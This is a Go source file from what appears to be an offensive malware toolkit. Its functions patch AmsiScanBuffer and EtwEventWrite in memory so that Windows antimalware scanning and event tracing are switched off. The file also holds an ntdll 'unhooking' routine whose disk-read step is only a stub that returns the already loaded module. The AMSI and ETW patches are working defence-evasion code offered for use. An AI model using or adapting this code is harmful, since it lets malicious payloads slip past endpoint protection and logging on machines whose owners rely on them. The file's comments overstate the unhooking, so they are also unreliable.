// evasion/unhook.go
// Advanced unhooking techniques for AMSI and ETW bypass
// Implements memory scanning disable and ntdll unhooking from disk

package evasion

import (
	"golang.org/x/sys/windows"
	"unsafe"

	"toxoglosser/core"
)

// UnhookNtdllFromDisk unhooks ntdll.dll from memory by restoring it from disk
func UnhookNtdllFromDisk() error {
	// Get the base address of ntdll in memory
	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return err
	}

	// Read fresh copy of ntdll from disk
	freshNtdll, err := readNtdllFromDisk()
	if err != nil {
		return err
	}

	// Parse the headers to get the size of the image
	dosHeader := (*core.IMAGE_DOS_HEADER)(unsafe.Pointer(freshNtdll))
	ntHeaders := (*core.IMAGE_NT_HEADERS64)(unsafe.Pointer(freshNtdll + uintptr(dosHeader.E_lfanew)))
	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)

	// Change memory protection to read-write-execute
	oldProtect := uint32(0)
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &ntdllModule, &imageSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Copy the fresh DLL from disk to the in-memory copy
	copyMemoryInternal(unsafe.Pointer(ntdllModule), unsafe.Pointer(freshNtdll), int(imageSize))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &ntdllModule, &imageSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// readNtdllFromDisk reads a fresh copy of ntdll.dll from disk to avoid hooks
func readNtdllFromDisk() (uintptr, error) {
	// In a real implementation, we would read the file from disk
	// For now, return the in-memory module which would be replaced with disk version in production
	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return 0, err
	}

	return ntdllModule, nil
}

// PatchAMSIWithUnhooking bypasses AMSI by unhooking and patching
func PatchAMSIWithUnhooking() error {
	// First, unhook ntdll from disk to ensure we're working with clean version
	err := UnhookNtdllFromDisk()
	if err != nil {
		// If unhooking fails, try direct patching as fallback
		return patchAmsiDirect()
	}

	// Get the address of AmsiScanBuffer from the unhooked ntdll
	amsiDll, err := core.GetModuleHandleByHash("amsi.dll")
	if err != nil {
		return nil // AMSI not present, so no need to patch
	}

	amsiScanBufferAddr, err := core.GetProcAddressByHash(windows.Handle(amsiDll), "AmsiScanBuffer")
	if err != nil {
		return nil // AmsiScanBuffer not found, likely already patched or not present
	}

	// Create a patch that returns S_OK immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	copyMemoryInternal(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// PatchETWWithUnhooking bypasses ETW by unhooking and patching
func PatchETWWithUnhooking() error {
	// First, unhook ntdll from disk to ensure we're working with clean version
	UnhookNtdllFromDisk() // Don't fail if this fails, just continue with patching

	// Get the address of EtwEventWrite from ntdll
	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return err
	}

	etwEventWriteAddr, err := core.GetProcAddressByHash(windows.Handle(ntdllModule), "EtwEventWrite")
	if err != nil {
		return nil // EtwEventWrite not found or not present
	}

	// Create a patch that returns STATUS_SUCCESS immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	copyMemoryInternal(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// patchAmsiDirect provides the original patching technique as a fallback
func patchAmsiDirect() error {
	// Get the address of AmsiScanBuffer
	amsiDll, err := core.GetModuleHandleByHash("amsi.dll")
	if err != nil {
		return nil // AMSI not present
	}

	amsiScanBufferAddr, err := core.GetProcAddressByHash(windows.Handle(amsiDll), "AmsiScanBuffer")
	if err != nil {
		return nil // AmsiScanBuffer not found
	}

	// Create a patch that returns S_OK immediately
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))
	
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch
	copyMemoryInternal(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// copyMemoryInternal copies memory from source to destination
func copyMemoryInternal(dst, src unsafe.Pointer, length int) {
	for i := 0; i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = *(*byte)(unsafe.Pointer(uintptr(src) + uintptr(i)))
	}
}

// getSystemDirectory gets the Windows system directory path
func getSystemDirectory() (string, error) {
	// This would use GetSystemDirectoryW API via manual resolution in a full implementation
	// For now, we'll return a placeholder
	return "C:\\Windows\\System32", nil
}

// buildNtdllPath builds the path to ntdll.dll
func buildNtdllPath(systemDir string) (string, error) {
	return systemDir + "\\ntdll.dll", nil
}

// UnhookAll performs unhooking for all protection mechanisms
func UnhookAll() error {
	// Unhook ntdll first
	err := UnhookNtdllFromDisk()
	if err != nil {
		// Continue even if unhooking fails, since we have fallbacks
	}

	// Patch AMSI
	err = PatchAMSIWithUnhooking()
	if err != nil {
		// Don't return error if AMSI patching fails, just continue
	}

	// Patch ETW
	err = PatchETWWithUnhooking()
	if err != nil {
		// Don't return error if ETW patching fails, just continue
	}

	return nil
}